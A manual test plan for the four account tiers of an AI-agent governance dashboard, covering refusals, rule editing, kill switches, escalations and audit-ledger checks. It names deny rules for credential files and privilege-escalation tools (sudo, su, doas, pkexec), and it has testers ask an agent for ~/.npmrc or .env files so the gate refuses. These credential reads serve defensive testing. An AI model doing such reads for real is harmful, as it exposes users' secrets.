# T47: the by-hand test plan

**One list per RBAC tier, split between Kinan, Mohammad and Malek.**

Everything this project has verified is either automated or was driven by whoever
wrote it. What has never happened is **three people exercising the four tiers from the
operator's chair**: what a Root can do that an Administrator cannot, what a User sees,
what a Viewer is refused, and, the question that matters most, **whether every refusal
explains itself**.

This produces the operator-visible evidence Chapter 4 needs. It is the companion to T2
(a real model, refused by the gate, 2026-09-06).

**Checked against the code on 2026-09-14.** Every row describes the build in this
repository. The VPS runs an older build until it is rebuilt (§0, step 1), and several
rows fail on that build for reasons already fixed.

---

## 0. Before you start

### Who does what

| Person       | Signs in as           | Runs                             |
| ------------ | --------------------- | -------------------------------- |
| **Kinan**    | `Root`                | §1 Root, then §5 with the others |
| **Mohammad** | `Administrator`       | §2 Administrator                 |
| **Malek**    | `User`, then `Viewer` | §3 User, §4 Viewer               |

**Do not share one browser.** Each person on their own machine, own SSH tunnel, own
session. Half of what this plan tests is that one account cannot see or do another's,
and a shared browser session silently defeats that.

### Setup

1. Kinan updates the VPS to the current build (`mg/HANDOFF.md` §1, "Updating the VPS to
   the current build"). **Without this, most of §6c and all of §6d test code that is
   not there.**
2. Kinan creates the Root account, then an Administrator for Mohammad.
3. Mohammad creates or registers an agent, and asks Kinan to create Malek's User
   account answering to Mohammad. Mohammad assigns Malek one agent.
4. Malek's Viewer account is created last, at §4.
5. **Set the escalation timeout to 30 seconds before anybody starts, and leave it
   there** (Policy, _Approval timeout_; Administrator or Root). The shipped default is
   300 seconds, right for a real installation and wrong for a test session: every row
   that waits for an unanswered escalation to lapse costs five minutes. Set it back
   afterwards if the installation is going to be used for anything real.
6. **Confirm the model is connected** (Models settings should show a verified
   connection). A row with no model behind it looks like a governance result and is
   not. T2 was done on 2026-09-06 with Kimi driving agent `jack`.
7. **Ask for a boring file, not a scary one.** When a row wants the gate to refuse
   something, ask for `~/.npmrc` or a `.env`. A model asked for `~/.ssh/id_rsa` refuses
   on its own, before any tool call, so nothing reaches the gate and nothing is
   recorded. That cost the first attempt at T2.

### How to record a result

**Results go in the shared sheet, not in this file.** One row per finding, with
dropdowns for who found it, which tier you were signed in as, severity and status:

<https://docs.google.com/spreadsheets/d/1p8cP0liDAu8yVmDSwtm5tmlWuy9OEyTWIYJoyMriF14/edit>

**Write what actually happened, not "OK".** The value of this exercise is in the wording
of the refusals. The sheet has an **Error / rule shown** column for the exact text or
rule id, e.g. `governance: ...` or
`core-path-credential-files-env-private-keys-npmrc-netrc-re`, which turns "it was
refused" into "it was refused _by this rule_".

**Two things to write down every single time:**

- **Was the outcome visible?** An action that produces nothing, with nothing explaining
  why, is this project's worst bug class. If you clicked something and the screen did
  not change, that is a finding even if the server did the right thing.
- **Did the refusal say what to do instead?** "You cannot do that" is a half-finished
  refusal. "Only an Administrator can write a rule that binds every agent. Name one of
  your agents instead" is a finished one.

**Row numbers are stable.** A row that became wrong was corrected where it stands rather
than renumbered, so the sheet's references still point at the right check. A finding
number beside a row names the defect that comes back if the row fails.

### Screenshot everything that refuses you

Chapter 4 needs pictures of a system saying no. Name them `tier-section-number.png`,
e.g. `user-3.7.png`.

---

## 1. Root — Kinan

Root manages **people**. Administrator manages **agents**. That split is the thing to
keep checking: several of these rows exist because a Root control and an Administrator
control were once the same function.

### 1.1 Identity and the page itself

| #     | Do this                              | Expect                                                                                                                                                                        |
| ----- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1.1.1 | Open the dashboard before signing in | The page says **Governance** as its title, and shows a sign-in form, not a blank panel                                                                                        |
| 1.1.2 | Sign in with the wrong password      | Refused. The message must **not** say whether the account exists                                                                                                              |
| 1.1.3 | Get the password wrong five times    | Locked out: _"Too many failed login attempts. Try again in 15 minutes."_ The wait is stated in the sentence, not only in a header (finding 368). Then wait it out and sign in |
| 1.1.4 | Sign in correctly                    | The Identity panel names you and your tier, root                                                                                                                              |
| 1.1.5 | Read the section list on the left    | Every entry jumps to a section that exists. Count them, and count the sections on the page: the two numbers must match                                                        |
| 1.1.6 | Sign out, then press Back            | You are signed out. The page does not show stale data from the session that ended                                                                                             |

### 1.2 Accounts

| #      | Do this                                                                          | Expect                                                                                                                                                                                                                        |
| ------ | -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1.2.1  | Create an Administrator for Mohammad                                             | Appears in the list with role `administrator`                                                                                                                                                                                 |
| 1.2.2  | Look for a way to create a second Root                                           | The role picker offers viewer, user and administrator, **no root**. With `curl`, `POST /control-ui/governance/users` with `role: "root"` is refused, and the message says there can be only one                               |
| 1.2.3  | Create a User with **no** Administrator chosen                                   | Refused **before** you submit: _Create_ stays disabled, and a hint says to choose the Administrator the account answers to                                                                                                    |
| 1.2.4  | Create a User and pick Mohammad as its Administrator                             | Created. The row shows who answers for it                                                                                                                                                                                     |
| 1.2.5  | Change that User to Viewer                                                       | A confirmation appears **first**, naming the account and both roles                                                                                                                                                           |
| 1.2.6  | Try to change your own Root row's role                                           | No control offered. The row states `root (permanent, cannot be changed)`                                                                                                                                                      |
| 1.2.7  | Set a new password on Mohammad's account                                         | Succeeds. Mohammad's existing session should **stop working**; check with him                                                                                                                                                 |
| 1.2.8  | Set your own password, sign out, sign back in with the new one                   | Works. The confirmation said beforehand that your own session would end                                                                                                                                                       |
| 1.2.9  | Try to delete your own Root account                                              | Refused: _"You cannot delete the account you are signed in with. To remove your own Root account, delete the organisation…"_                                                                                                  |
| 1.2.10 | Delete a spare account you created for this                                      | Confirmation names the account. Gone from the list                                                                                                                                                                            |
| 1.2.11 | With your signed-in session, call `GET /control-ui/governance/users` with `curl` | The same people as the Accounts section, with their ids. **Cross-check it against the screen**: two surfaces disagreeing about who exists is what this row is for                                                             |
| 1.2.12 | Ask Mohammad to make the same call with his session                              | **403.** Accounts are Root's, and the route enforces that itself rather than trusting the page                                                                                                                                |
| 1.2.13 | Create an agent and pick **yourself** as its owner                               | Accepted. The picker names you as "(you, Root)". A lone Root must be able to create an agent (finding 277)                                                                                                                    |
| 1.2.14 | Ask Mohammad to assign that Root-owned agent to Malek                            | Accepted. An agent Root owns sits in no Administrator's silo, so it is assignable to anyone in the organisation. A refusal would mean a class of agent nobody can be given                                                    |
| 1.2.15 | Check the picker that asks who a **User answers to**                             | Root is **not** in that list. Owning an agent and being answered to are different questions                                                                                                                                   |
| 1.2.16 | Sign out, then sign back in **in the same browser tab**                          | The previous session's account list, pending decisions and any open agent conversation are **gone**. A transcript still readable from before signing out is finding 271, and the next person at that machine would see it too |

### 1.3 Withholding policy authoring (T27)

**Do this while Malek is signed in and watching, without reloading.** His rule buttons
must disappear and come back within about fifteen seconds, and his Identity panel must
change with them. Nothing happening until he signs out and in again is finding 305.

This is the row most likely to find something, because it is the only place two
different questions are deliberately kept apart.

| #     | Do this                                              | Expect                                                                                                                |
| ----- | ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| 1.3.1 | On Malek's User row, press **Withhold rule editing** | The button flips to offer granting it back, and the row reads _"Cannot write rules — Root withheld it"_               |
| 1.3.2 | Ask Malek to look at Policy                          | Malek can still see the Policy section and every rule in it                                                           |
| 1.3.3 | Ask Malek what is now missing                        | **The add-rule form, the folder-grant form, and Remove on every rule.** They should be gone, not present-and-refusing |
| 1.3.4 | Ask Malek to stop his agent                          | **Still works.** Withholding authoring must not take away stopping your own agent                                     |
| 1.3.5 | Ask Malek to submit a rule request                   | **Still works.** Asking is the fallback withholding leaves him, and so is **Request a change for one agent**          |
| 1.3.6 | Grant it back                                        | The forms return within about fifteen seconds                                                                         |

### 1.4 The shipped rules, and the split core tier (T24)

| #     | Do this                                         | Expect                                                                                                                                                      |
| ----- | ----------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1.4.1 | Read the Policy section's rule list             | Core rules first, then baseline, then anything you wrote. Each shows its pattern in monospace beneath a plain-English description                           |
| 1.4.2 | Find a core denial with a **Switch off** button | e.g. "Privilege escalation (sudo, su, doas, runas, pkexec)"                                                                                                 |
| 1.4.3 | Find one **without** it                         | e.g. "The governance layer's own policy, accounts, audit ledger and signing key". The row must say **"Cannot be switched off"** rather than showing nothing |
| 1.4.4 | Read the row above the list explaining why      | It explains the split without you having to hover anything                                                                                                  |
| 1.4.5 | Switch off the privilege-escalation denial      | Confirmation first. The rule leaves the rule list and appears near the top of Policy, marked as switched off by Root                                        |
| 1.4.6 | Open **Deployment and network posture**         | The core-rules check (`deployment.core_rules_intact`) now fails, naming that rule, and its remedy points at the Policy section                              |
| 1.4.7 | Press **Switch on** beside that rule            | It returns to the rule list and the check passes again. No **Switch on** anywhere is finding 367                                                            |

### 1.5 Policy settings above the User tier

| #     | Do this                                         | Expect                                                                                     |
| ----- | ----------------------------------------------- | ------------------------------------------------------------------------------------------ |
| 1.5.1 | Set the escalation timeout to 30 seconds        | Accepted. Administrator and Root both may                                                  |
| 1.5.2 | Set it to 2 seconds                             | Refused, and the message states the allowed range (5 seconds to 24 hours)                  |
| 1.5.3 | Set a per-account ask override for Malek        | Accepted, and visible when you reload. Root only                                           |
| 1.5.4 | Set one for an account name that does not exist | **A warning, not a refusal**, and it must say no account of that name exists (finding 143) |
| 1.5.5 | Clear the override                              | Returns to the default                                                                     |

### 1.6 The Codex backend

| #     | Do this                                | Expect                                                                                 |
| ----- | -------------------------------------- | -------------------------------------------------------------------------------------- |
| 1.6.1 | Read the row before touching it        | It says the backend is off by default and why that is the safe answer                  |
| 1.6.2 | Open **Why this is off by default**    | Eight paragraphs, readable, not pressed against the edge of the card                   |
| 1.6.3 | Turn it on                             | A confirmation naming the enforcement gap. Read it: does it tell you what still works? |
| 1.6.4 | Cancel the dialog                      | The switch stays **off**. It must not flip and then flip back                          |
| 1.6.5 | Turn it on for real                    | On. Check the audit ledger records it against you                                      |
| 1.6.6 | Look at a path denial in the rule list | It should now carry the Codex search caveat                                            |
| 1.6.7 | Turn it off                            | A different warning, about supervised chats                                            |

### 1.7 The deployment report

| #     | Do this                                       | Expect                                                                                                                                    |
| ----- | --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| 1.7.1 | Open **Deployment and network posture**       | Checks for the listener (`bind_loopback`), Gateway authentication, the governance files' permissions, the ledger key and the tunnel route |
| 1.7.2 | Read the failing rows                         | Each names what to do about it, not just what is wrong                                                                                    |
| 1.7.3 | `chmod 644` the ledger key on the VPS, reload | The files-permission check goes red and names the fix                                                                                     |
| 1.7.4 | `chmod 600` it back                           | Green again                                                                                                                               |

### 1.8 The organisation (do this LAST — it is irreversible)

| #     | Do this                             | Expect                                                           |
| ----- | ----------------------------------- | ---------------------------------------------------------------- |
| 1.8.1 | Open the Organisation panel         | It states what deletion removes: every account and every agent   |
| 1.8.2 | Type the wrong username to confirm  | The delete control stays disabled                                |
| 1.8.3 | Type your Root username and confirm | Everything goes. You land on the create-the-first-account screen |
| 1.8.4 | Check the audit ledger file on disk | **It is still there.** The trail is kept deliberately            |
| 1.8.5 | Verify the chain                    | `node scripts/verify-ledger.mjs` reports it intact               |

---

## 2. Administrator — Mohammad

Administrator manages **agents**. Your scope is every agent in the organisation; you do
**not** manage people.

### 2.1 What you must not see

| #     | Do this                                                                                | Expect                                                   |
| ----- | -------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| 2.1.1 | Look for an Accounts section                                                           | **Not on your page at all.** Not present-and-disabled    |
| 2.1.2 | Look for the Organisation panel                                                        | Not there                                                |
| 2.1.3 | Look for Deployment and network posture                                                | Not there                                                |
| 2.1.4 | Look for a **Switch off** button on a core rule                                        | Not there. Lowering the shipped floor is Root's          |
| 2.1.5 | Ask Kinan for the API path of one of those, and call it with `curl` using your session | **Refused by the server**, not merely hidden by the page |

Row 2.1.5 is the important one. Everything the dashboard hides, the server must also
refuse. Hiding a control is a courtesy; it is never the control.

### 2.2 The agent registry

| #      | Do this                                                                     | Expect                                                                                                                                                                                                |
| ------ | --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2.2.1  | Open **Agents in your organisation** on a fresh install                     | "No agents yet", and an explanation of the two ways to get one                                                                                                                                        |
| 2.2.2  | Create an agent, leaving the owner blank                                    | Either refused before submitting, or a message naming what to choose                                                                                                                                  |
| 2.2.3  | Create an agent with yourself as owner                                      | It appears **and** exists in OpenClaw; check with `openclaw agents list`. Creating it can take tens of seconds, longer as agents accumulate                                                           |
| 2.2.4  | Create a second agent with the same id                                      | Refused as a duplicate                                                                                                                                                                                |
| 2.2.5  | Create one with the id typed in **different case**                          | Refused as a duplicate. Case must not be a way round uniqueness                                                                                                                                       |
| 2.2.6  | Register an agent OpenClaw already has                                      | Recorded without creating a second one                                                                                                                                                                |
| 2.2.7  | Press Remove on an agent                                                    | **Two named options** with their consequences, then a confirmation stating it cannot be undone                                                                                                        |
| 2.2.8  | Choose "unregister"                                                         | The governance record goes; the OpenClaw agent stays, **with its rules, posture and lockdown kept** (T55)                                                                                             |
| 2.2.9  | Choose "delete" on another that has a rule and a posture override           | Both go, and the confirmation said what the id carried would be cleared with it (T55). Agent permissions for that id then shows nothing                                                               |
| 2.2.10 | Create an agent with a distinctive name, then ask it _"what is your name?"_ | It answers with the name you gave it. It must **not** ask what you would like to call it: an agent that asks can be told something else, and then the registry and the agent disagree about who it is |
| 2.2.11 | Read the third and fourth boxes on the create form                          | They say what they **are**, a working directory and a model, not only that they are optional                                                                                                          |

### 2.3 Assigning agents to people

**Needs Malek on his own machine, signed in and not touching anything.** Assign him an
agent, then take it away, and have him watch **Your agents** each time without
reloading. Both must land within about fifteen seconds (finding 305).

| #     | Do this                                | Expect                                                  |
| ----- | -------------------------------------- | ------------------------------------------------------- |
| 2.3.1 | Assign your agent to Malek             | Saved. It appears on Malek's page without a reload      |
| 2.3.2 | Assign an agent id that does not exist | Refused, and the message says registration is required  |
| 2.3.3 | Type the id in different case          | Accepted and folded. Malek must still be able to use it |

### 2.4 Policy

| #     | Do this                                                       | Expect                                                                                            |
| ----- | ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| 2.4.1 | Add an allow rule for `^ls( .*)?$` binding every agent        | Accepted. You may write global rules; Malek may not                                               |
| 2.4.2 | Add the same rule again                                       | _"Rule added, but an earlier rule already covers it"_, naming the earlier rule, brought into view |
| 2.4.3 | Add a rule with a broken regular expression                   | Refused, with the error, before anything is stored                                                |
| 2.4.4 | Add a rule with a pattern designed to be slow, e.g. `^(a+)+$` | Refused by the safety checker                                                                     |
| 2.4.5 | Add a rule with a 5-minute lifetime                           | Row shows when it expires. Come back later and confirm it is gone                                 |
| 2.4.6 | Press **Who does this affect?** on a global rule              | Names every agent it binds, and says it binds ones not created yet                                |
| 2.4.7 | Use **Allow a folder, except…** with one exception            | Writes **two** rules, the grant and the exception, and lists both back to you                     |
| 2.4.8 | Remove one of the two                                         | The other stays, and behaves as the explainer said it would                                       |
| 2.4.9 | Filter the rule list to a term matching nothing               | _"No rules match this filter"_, **not** "no rules yet"                                            |

### 2.5 Per-agent posture

| #     | Do this                                                                                                       | Expect                                                                                                                                                                                       |
| ----- | ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2.5.1 | Set one agent to **Monitor**                                                                                  | Row appears showing the override                                                                                                                                                             |
| 2.5.2 | Have Malek look for the same control                                                                          | **No control on his page.** In its place a note, _"Change one agent's posture or escalation"_, points him at the request form (§6d.5). These are Administrator and above                     |
| 2.5.3 | Press **Use default**                                                                                         | Override cleared                                                                                                                                                                             |
| 2.5.4 | Set a per-agent escalation timeout                                                                            | Accepted, and Malek **can** set this one for his own agent                                                                                                                                   |
| 2.5.5 | Under **Escalation for one agent**, press **Ask a human** before picking an agent, then pick one and press it | Nothing can be pressed until an agent is picked. Then a row _"Agent override: <agent>"_ appears reading **Ask a human**; **Deny** sets it to Deny, and **Use default** on that row clears it |
| 2.5.6 | Have Malek look for the same control                                                                          | **Not on his page**, as in 2.5.2: the note pointing at the request form stands where both per-agent controls would be                                                                        |

_(Rows 2.5.5 and 2.5.6 replaced a known-gap note on 2026-09-14, when sweep task A12 built
the control: until then the dashboard could clear one agent's escalation override and not
set one.)_

### 2.6 The emergency kill switch

| #     | Do this                                          | Expect                                                                                                                                          |
| ----- | ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| 2.6.1 | Have Malek start a long prompt on his agent      | It shows under Active agent sessions                                                                                                            |
| 2.6.2 | Press **Lock down** on that agent                | **A confirmation first**, as Stop in Active agent sessions asks. Then it reports whether the agent **actually stopped**, not just that it tried |
| 2.6.3 | Ask Malek what he saw                            | His prompt was cut off, and the conversation says the agent was stopped by the emergency kill switch                                            |
| 2.6.4 | Try any tool call on that agent                  | Refused                                                                                                                                         |
| 2.6.5 | Stop an agent using the id in **different case** | Must still stop it. **Finding 202** once reported success and stopped nothing                                                                   |
| 2.6.6 | Release the lockdown                             | Agent works again                                                                                                                               |
| 2.6.7 | Stop an agent id that does not exist             | Refused with "no such agent", worded identically to the refusal for an agent in another organisation                                            |

### 2.7 Rule requests

| #      | Do this                                                                                                                                         | Expect                                                                                                                                                                                                                                    |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2.7.1  | Look at Malek's pending request                                                                                                                 | Shows the pattern, the reason, who asked, and **whether it binds one agent or all of them**. If approving it would warn or clash, the row says so under _"If this is approved"_ (§6d.3)                                                   |
| 2.7.2  | Approve it                                                                                                                                      | The rule appears in the policy list                                                                                                                                                                                                       |
| 2.7.3  | Try to decide the same request again                                                                                                            | Refused; the first decision stands                                                                                                                                                                                                        |
| 2.7.4  | Reject another                                                                                                                                  | Recorded as rejected, with your name on it                                                                                                                                                                                                |
| 2.7.5  | Get an agent to trigger an escalation, and answer it **Always allow**                                                                           | Three buttons: Allow once, Always allow, Deny. Always allow lets the action through **and files a rule request**; it must **not** create a rule by itself. Policy list: no new rule. Request queue: one pending request                   |
| 2.7.6  | Read that request before approving it                                                                                                           | It names the **exact** command or path that was escalated, anchored so it matches that and nothing else, and it is scoped to **one agent**. A request binding every agent is a finding                                                    |
| 2.7.7  | Approve it, then read the ledger                                                                                                                | The rule now exists and the approval is recorded against **you**, by name and tier. The request itself was filed by `hitl-approval`, a label rather than an account, because the person pressing a prompt is not identified to this layer |
| 2.7.8  | Trigger the same escalation again and answer Always allow twice                                                                                 | **One** request in the queue, not two or three                                                                                                                                                                                            |
| 2.7.9  | Make the agent trigger an escalation by **reading** a file, answer **Always allow**, approve it, then ask the agent to **write** that same file | The write is still refused or escalates. The queue row said **path (read)** before you approved. Allowed is finding 279: approving a read granted a write                                                                                 |
| 2.7.10 | With that read grant approved, get the agent to escalate a **write** to the same file and answer Always allow                                   | A **second** request appears. A read and a write of one file are two different grants                                                                                                                                                     |
| 2.7.11 | Nothing to press: read §6b's note on a full queue                                                                                               | Requests filed by Always allow share one budget, 40 plus 20 for every account (T60). Filling it is not a by-hand row                                                                                                                      |

---

## 3. User — Malek

You manage **the agents assigned to you** and nothing else.

### 3.1 What you see

| #     | Do this                                                                               | Expect                                                                                                 |
| ----- | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| 3.1.1 | Sign in                                                                               | Identity names you and your tier, user                                                                 |
| 3.1.2 | Count your sections                                                                   | No Accounts, no Organisation, no Deployment, no agent registry management                              |
| 3.1.3 | Look at **Your agents**                                                               | Only the agents assigned to you                                                                        |
| 3.1.4 | Ask Mohammad for an agent id he did **not** assign you, and try to use it             | Refused, worded so it does not tell you whether that agent exists                                      |
| 3.1.5 | Read the agent rows in **Your agents**                                                | Each names the agent, e.g. `Scout Bot scout`, not `scout` alone (finding 309)                          |
| 3.1.6 | **Two people.** Ask Mohammad to assign you **another** agent while you stay signed in | It appears within about fifteen seconds, without a reload (finding 305)                                |
| 3.1.7 | **Two people.** Ask Mohammad to take one **away** while you stay signed in            | It disappears within about fifteen seconds. A message box that stays and refuses is finding 305 or 354 |

### 3.2 Using your agent

| #      | Do this                                                                                                     | Expect                                                                                                                                                                                            |
| ------ | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 3.2.1  | Send your agent a prompt                                                                                    | The reply arrives as it is written, not all at once at the end                                                                                                                                    |
| 3.2.2  | Cancel a running prompt                                                                                     | The prompt stops. **The agent is not locked down**; send another to prove it                                                                                                                      |
| 3.2.3  | Send a prompt with a file attached                                                                          | Recorded by hash, type and size. **Open the ledger and confirm the file's contents are not in it**                                                                                                |
| 3.2.4  | Start three long prompts at once                                                                            | The third is refused with a message: two may run at once for one account (six for the installation). Nothing is silently dropped                                                                  |
| 3.2.5  | Read the transcript back                                                                                    | Your prompt is recorded against **your** account                                                                                                                                                  |
| 3.2.6  | Type a message and watch the **Send** button                                                                | It becomes clickable as you type (finding 269)                                                                                                                                                    |
| 3.2.7  | Pick your agent from the list, then press **Talk**                                                          | The conversation opens and stays open. Pressing Talk must not close it or empty the id box                                                                                                        |
| 3.2.8  | Ask the agent for something your policy refuses (`~/.npmrc`)                                                | The refusal is in the ledger, and if the agent replies with **nothing at all** the panel says so in words (finding 272). An empty reply is the normal outcome when every action was refused       |
| 3.2.9  | Send a message and watch the panel **while it is answering**                                                | Your own message is shown straight away, above the agent's "replying…" (finding 308)                                                                                                              |
| 3.2.10 | With several agents assigned, open the **first** one                                                        | The conversation appears under **that** agent's row, and its id is not printed twice (finding 307)                                                                                                |
| 3.2.11 | Look at the width of the message box                                                                        | It spans the panel (finding 312)                                                                                                                                                                  |
| 3.2.12 | Send a prompt that will take a while, then **reload the page** before it finishes and reopen the same agent | The task is still there: the conversation shows it **Running** with **Cancel**, and _Active agent sessions_ lists the same task (T63, finding 350). Only the emergency stop left is T63 regressed |
| 3.2.13 | Press **Cancel** on that recovered task, from _Active agent sessions_ this time                             | Both places change to **Stopping** together and neither Cancel can be pressed again; when it has stopped, it disappears from both. The agent is **not** locked down                               |
| 3.2.14 | While a task is running in this tab, try to open a different agent's conversation                           | A sentence tells you a task is still running here, rather than a composer that silently ignores what you type                                                                                     |

### 3.3 Stopping your own agent

| #     | Do this                                  | Expect                                                   |
| ----- | ---------------------------------------- | -------------------------------------------------------- |
| 3.3.1 | Stop your assigned agent                 | A confirmation first. Then it reports whether it stopped |
| 3.3.2 | Try to stop an agent not assigned to you | Refused, with a sentence before you press                |
| 3.3.3 | Release your agent                       | Works                                                    |

### 3.4 Policy, read and write

| #     | Do this                                   | Expect                                                                                    |
| ----- | ----------------------------------------- | ----------------------------------------------------------------------------------------- |
| 3.4.1 | Read the Policy section                   | You can see every rule, including core ones                                               |
| 3.4.2 | Add a rule **without** naming an agent    | Refused: a global rule is an Administrator's. The message says to name one of your agents |
| 3.4.3 | Add a rule naming your own agent          | Accepted                                                                                  |
| 3.4.4 | Add a rule naming somebody else's agent   | Refused                                                                                   |
| 3.4.5 | Remove a rule you wrote                   | Works                                                                                     |
| 3.4.6 | Look at a **core** rule and a global rule | No Remove button on either                                                                |
| 3.4.7 | Look for the installation posture control | Read-only for you                                                                         |

### 3.5 Rule requests

| #     | Do this                                                     | Expect                                                                                                                    |
| ----- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| 3.5.1 | Submit a request naming your agent                          | Appears as pending                                                                                                        |
| 3.5.2 | Submit one with the agent left blank                        | Accepted as a request for a global rule. The form's hint says leaving the agent blank asks for a rule binding every agent |
| 3.5.3 | With twenty of your requests waiting, submit a twenty-first | Refused: _"You already have 20 pending requests; wait for a decision before submitting more."_                            |
| 3.5.4 | Watch Mohammad approve one                                  | The rule appears in your policy view                                                                                      |

### 3.6 The audit ledger

| #     | Do this                          | Expect                                                                                                                                                                                                                                                                   |
| ----- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 3.6.1 | Open the ledger                  | You see entries for your own agents                                                                                                                                                                                                                                      |
| 3.6.2 | Filter to **Agent actions**      | Only agent entries                                                                                                                                                                                                                                                       |
| 3.6.3 | Filter to **Policy changes**     | Only administrative ones                                                                                                                                                                                                                                                 |
| 3.6.4 | Press **Verify chain integrity** | Reports intact **with its working shown** (finding 268): how verification works, the chain head, the independent checkpoint agreeing with it, and the terminal command that recomputes it. **Read the head hash, run that command, and compare.** The page does not jump |

### 3.7 The refusals (record the exact wording of each)

| #     | Do this                                | Expect                                                     |
| ----- | -------------------------------------- | ---------------------------------------------------------- |
| 3.7.1 | Try to create an account               | No control. Confirm with `curl` that the route refuses too |
| 3.7.2 | Try to switch off a core rule          | No control, and refused server-side                        |
| 3.7.3 | Try to change another person's account | Refused                                                    |
| 3.7.4 | Try to set the installation posture    | Refused                                                    |
| 3.7.5 | Try to read the deployment report      | Refused                                                    |

---

## 4. Viewer — Malek's second account

A Viewer sees the audit trail and changes nothing.

| #   | Do this                                    | Expect                                                                                                                                      |
| --- | ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| 4.1 | Sign in as the Viewer                      | Identity names the tier, viewer                                                                                                             |
| 4.2 | Count the controls on the whole page       | **No button that changes anything**                                                                                                         |
| 4.3 | Read the ledger                            | Visible, but **resource details are hidden**: confirm you cannot read the file paths and commands a User can                                |
| 4.4 | Read the model's stated intent on an entry | A placeholder, not the text (finding 133)                                                                                                   |
| 4.5 | Try to stop an agent                       | No control, and the route refuses                                                                                                           |
| 4.6 | Look for a way to submit a request         | No request forms on the page. `POST /control-ui/governance/rule-requests` with `curl` is refused: proposing is the User tier                |
| 4.7 | Verify the chain                           | Allowed, **and a Viewer sees the same evidence**: the head hash and checkpoint are oversight information, not a secret                      |
| 4.8 | Read the Rule requests queue               | Readable in full, patterns and reasons included, as the Identity sentence says (finding 331, decided (b)). No "If this is approved" buttons |

---

## 5. Together — the things one person cannot test alone

Do these with all three of you signed in at once.

| #   | Do this                                                             | Expect                                                                                                                         |
| --- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| 5.1 | Mohammad stops Malek's agent while Malek is prompting it            | Malek sees it stop, **with a reason**, not a hang                                                                              |
| 5.2 | Kinan changes Mohammad's password mid-session                       | Mohammad's next action fails as a lost session and returns him to sign-in, not to a broken page                                |
| 5.3 | Kinan withholds Malek's authoring while Malek has a half-typed rule | Malek's forms go within about fifteen seconds; check whether the page told him why                                             |
| 5.4 | Kinan deletes Mohammad's account while he is signed in              | Refused while accounts answer to him: the message names Malek and says to assign those accounts to another Administrator first |
| 5.5 | All three act at once, then Kinan reads the ledger                  | Every one of the three appears, **each with the tier they held at the time**                                                   |
| 5.6 | Kinan verifies the chain after all of it                            | Intact                                                                                                                         |

---

## 6. Rows from the lifecycle and bounds sweeps (2026-09-05)

All four were found and fixed in code, and are here because each is a promise about
**what an operator sees**. They need two people, and row 6.1 is the one to do first.

| #       | Who              | Do this                                                                                                                                                                                                                                                                          | What must happen                                                                                                                                                         |
| ------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **6.1** | Kinan + Malek    | Malek sends the agent a prompt with something recognisable in it ("the Ahmad matter"). Kinan sets Malek's escalation override to `off`, then **deletes Malek's account**. Kinan then creates a **new** account with the **same username** and gives it to Mohammad to sign into. | Mohammad sees an **empty conversation**, and no per-account escalation override. Either wrong is finding 256, a confidentiality failure across the account boundary      |
| **6.2** | Kinan            | Before deleting an account that has a transcript, note the number of turns. After deleting, search the audit ledger for the deleted account's name.                                                                                                                              | The **ledger still holds the prompts**. The transcript is gone and the record is not                                                                                     |
| **6.3** | Kinan            | Read the ledger entry for the deletion itself.                                                                                                                                                                                                                                   | It **names what it destroyed**: a turn count, and the escalation override if there was one                                                                               |
| **6.4** | Malek + Mohammad | Malek's agent triggers **three or four** distinct unanswered escalations (vary the path each time), and Mohammad's agent triggers one.                                                                                                                                           | Both agents' questions appear under _Awaiting your decision_, each naming the right agent, and **no** "this list is incomplete" notice appears, because nothing was shed |

**Why row 6.4 does not fill the list.** The list holds 200 unanswered questions
(`MAX_PENDING_UNDECIDED`); when it overflows, the busiest agent loses its own oldest row
first (finding 260), and the page says how many were dropped, even when nothing is left
waiting (T56). Filling it takes 200 escalations, over an hour and a half at a 30-second
timeout. `docs-notes/qa-sweep-2026-09-05/bounds-sweep.ts` drives 210 questions through
the real code in seconds, and the store and panel tests cover the notice. What a person
checks is the opposite case: with a handful waiting and nothing shed, **no** warning. A
warning that is always on is a warning nobody reads.

## 6b. Rows from T60 and T63 (built 2026-09-11)

| #        | Who                      | Do this                                                                                                          | Expect                                                                                                                                                                                                        |
| -------- | ------------------------ | ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **6b.1** | Anyone with an agent     | Get the agent to attempt something no rule covers, with escalation on, so an approval card appears               | The card's description ends: _"Always allow" allows this action once and requests permission for future attempts. An Administrator must approve the request before permission becomes permanent._             |
| **6b.2** | Same                     | Press **Always allow**                                                                                           | The action runs **once**. A matching request appears in **Rule requests**. **No dialog appears afterwards**                                                                                                   |
| **6b.3** | Kinan + Mohammad         | Mohammad approves that request in Rule requests; the agent attempts the same action again                        | It is allowed with no card, and the ledger names Mohammad as the one who approved the rule                                                                                                                    |
| **6b.4** | Kinan                    | With one escalation timed out into **Awaiting your decision**, press **Would allow**                             | The row leaves the list and a request appears in Rule requests. Had the queue been full, the banner at the top of the page would read _"Your answer was recorded."_ followed by why the request was not saved |
